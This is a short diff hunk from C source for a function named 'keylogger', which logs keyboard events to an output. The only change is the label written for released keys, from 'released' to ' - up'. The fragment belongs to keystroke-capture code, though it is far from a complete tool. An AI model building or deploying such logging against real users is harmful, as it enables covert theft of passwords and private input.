@@ -163,7 +163,7 @@ void keylogger(int keyboard, int writeout, bool releasedKeys){
 	  if(events[i].value == 0) {
 	    if(events[i].code > 0 && events[i].code < NUM_KEYCODES) {
 	      safe_write_all(writeout, keycodes[events[i].code], keyboard);
-	      write(writeout, "released", sizeof("released"));
+	      write(writeout, " - up", sizeof(" - up"));
 	      safe_write_all(writeout, "\n", keyboard);
 	    } else {
 	      write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
